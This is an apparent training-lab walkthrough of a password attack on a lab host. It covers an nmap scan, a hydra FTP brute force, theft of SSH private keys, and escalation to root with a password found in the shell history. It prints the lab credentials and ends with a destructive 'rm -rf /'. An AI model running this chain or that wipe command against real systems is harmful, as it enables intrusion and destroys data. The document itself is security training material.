# Password Attacks Lab - Easy

Our client Inlanefreight contracted us to assess individual hosts in their network, focusing on access control. The company recently implemented security controls related to authorization that they would like us to test. There are three hosts in scope for this assessment. The first host is used for administering and managing other servers within their environment.

## Walkthrough

```bash
nmap -A -T4 10.129.202.219 -oN nmap.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 13:30 EST
Nmap scan report for 10.129.202.219 (10.129.202.219)
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

well since we got 2 wordlist, we brute forcing this one

<pre class="language-bash"><code class="lang-bash"><strong>hydra -L username.list -P password.list  10.129.202.219 ftp -t 64
</strong>#[21][ftp] host: 10.129.202.219   login: mike   password: 7777777
</code></pre>

now lets download everything inside that ftp

```bash
wget ftp://mike:7777777@10.129.202.219/* .
ls
#authorized_keys  id_rsa  id_rsa.pub
OR
ftp 10.129.202.219
#Name (10.129.202.219:kali): mike
#331 Please specify the password.
ls
get id_rsa
exit
```

now we can use it to ssh as mike

```bash
chmod 600 id_rsa
ssh -i id_rsa mike@10.129.202.219
#passphrase:7777777
history
#    7  analysis.py -u root -p dgb6fzm0ynk@AME9pqu
su root
#dgb6fzm0ynk@AME9pqu
rm -rf /
```
